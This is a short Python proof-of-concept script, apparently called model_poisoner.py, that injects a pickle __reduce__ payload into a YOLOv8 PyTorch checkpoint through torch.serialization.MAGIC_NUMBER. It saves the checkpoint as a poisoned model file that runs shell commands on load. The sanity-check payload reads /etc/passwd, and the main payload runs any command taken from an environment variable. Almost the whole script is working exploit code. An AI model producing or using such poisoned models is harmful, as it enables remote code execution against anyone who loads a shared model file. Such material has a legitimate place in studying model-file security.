import torch
from ultralytics import YOLO

# Simple POC to make sure the exploit is working
ON_REDUCE_SANITYCHECK = """
global MAGIC_NUMBER
MAGIC_NUMBER = None
import os; os.system('cat /etc/passwd')
"""

# To exec this: SAMPLE_NAME=ls python3 model_poisoner.py
ON_REDUCE = """
global MAGIC_NUMBER
MAGIC_NUMBER = None
import os; 
cmd = os.getenv('SAMPLE_NAME', False)
if cmd: os.system(cmd)
"""

class Payload:
    def __reduce__(self):
        return (exec, (ON_REDUCE,))

ORIGINAL = './models/yolov8n.pt'
MODIFIED = './models/yolov8n_modified.pt'

model = torch.load(ORIGINAL, weights_only=False)
torch.serialization.MAGIC_NUMBER = Payload()
torch.save(model, MODIFIED, _use_new_zipfile_serialization=False)

# Is the exploit working?
# model = torch.load(MODIFIED, weights_only=False)
model = YOLO(MODIFIED)